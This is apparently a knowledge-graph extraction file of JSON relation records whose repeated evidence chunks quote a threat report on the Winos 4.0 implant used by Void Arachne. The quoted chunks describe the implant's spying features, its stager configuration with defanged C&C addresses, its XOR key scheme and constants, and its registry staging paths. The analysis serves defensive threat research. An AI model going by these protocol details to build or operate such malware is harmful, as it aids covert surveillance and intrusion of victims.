            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--plugin-execution",
      "target": "tool--winos-4.0",
      "confidence": 0.95,
      "evidence": "Winos 4.0的C&C服务器通过插件执行多种任务",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--winos",
      "confidence": 0.95,
      "evidence": "报告分析了Winos 4.0框架",
      "chunks_info": [
        {
          "chunk_id": 22,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 C&C framework overview\n\nSimilar to [Cobalt Strike](/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html) and Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:",
          "chunk_length": 481,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 84,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 22,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "procedure--custom-plugins",
      "target": "tool--winos",
      "confidence": 0.9,
      "evidence": "Winos支持自定义插件开发",
      "chunks_info": [
        {
          "chunk_id": 22,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 C&C framework overview\n\nSimilar to [Cobalt Strike](/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html) and Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:",
          "chunk_length": 481,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 84,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 22,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "tool--winos",
      "target": "procedure--custom-plugins",
      "confidence": 0.9,
      "evidence": "Winos使用自定义插件扩展功能",
      "chunks_info": [
        {
          "chunk_id": 22,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 C&C framework overview\n\nSimilar to [Cobalt Strike](/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html) and Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:",
          "chunk_length": 481,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 84,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 22,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "procedure--stager-execution",
      "confidence": 0.95,
      "evidence": "报告记录了Winos stager的执行过程",
      "chunks_info": [
        {
          "chunk_id": 25,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
          "chunk_length": 702,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 130,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 25,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--stager-execution",
      "target": "tool--winos-stager",
      "confidence": 0.95,
      "evidence": "过程使用了Winos stager作为payload",
      "chunks_info": [
        {
          "chunk_id": 25,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
          "chunk_length": 702,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 130,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 25,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--stager-execution",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "过程下载并执行了LoginModule.dll",
      "chunks_info": [
        {
          "chunk_id": 25,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
          "chunk_length": 702,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 130,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 25,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--winox-4.0",
      "confidence": 0.95,
      "evidence": "报告分析了Winos 4.0加载器",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--c2-communication",
      "target": "asset--c2-server-1",
      "confidence": 0.95,
      "evidence": "程序使用第一个C&C服务器",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--c2-communication",
      "target": "asset--c2-server-2",
      "confidence": 0.95,
      "evidence": "程序使用第二个C&C服务器",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--c2-communication",
      "target": "asset--c2-server-3",
      "confidence": 0.95,
      "evidence": "程序使用第三个C&C服务器",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "procedure--c2-communication",
      "target": "tool--winox-4.0",
      "confidence": 0.95,
      "evidence": "C&C通信程序应用了Winos 4.0加载器",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--wino4-stager",
      "confidence": 0.95,
      "evidence": "报告分析了Winos 4.0 stager",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--encryption-key-generation",
      "target": "tool--wino4-stager",
      "confidence": 0.95,
      "evidence": "Winos 4.0 stager生成加密密钥",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "technique--c2-communication",
      "target": "procedure--encryption-key-generation",
      "confidence": 0.95,
      "evidence": "C2通信技术启动加密密钥生成过程",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--payload-deployment",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "部署LoginModule.dll作为下一阶段payload",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of 